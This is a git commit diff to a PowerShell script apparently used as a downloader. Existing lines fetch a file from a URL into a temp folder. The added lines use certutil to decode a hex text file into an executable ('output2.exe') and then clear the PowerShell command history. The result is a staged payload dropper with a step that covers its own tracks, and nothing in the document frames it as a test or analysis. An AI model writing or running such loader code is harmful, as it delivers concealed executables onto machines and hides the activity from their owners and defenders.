81b08da16bb011550fbd536d2c5d75d88a6f4fd4
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-20 19:05:08 +0800

    Update 1. DL file.ps1

--- WBPV/1. DL file.ps1
+++ WBPV/1. DL file.ps1
@@ -9,3 +9,15 @@ Invoke-WebRequest -Uri $url -OutFile $tempPath
 
 # Output the location of the downloaded file
 Write-Host "File downloaded to: $tempPath"
+
+# Define paths for input and output
+$hexFilePath = "$env:TEMP\example.txt"  # Path to your hex file in TEMP
+$outputExePath = "$env:TEMP\output2.exe"  # Path for the output EXE file
+
+# Use certutil to convert hex to binary
+certutil -f -decodeHex $hexFilePath $outputExePath
+
+Write-Host "Executable created at: $outputExePath"
+
+# Clear the PowerShell command history
+Clear-History
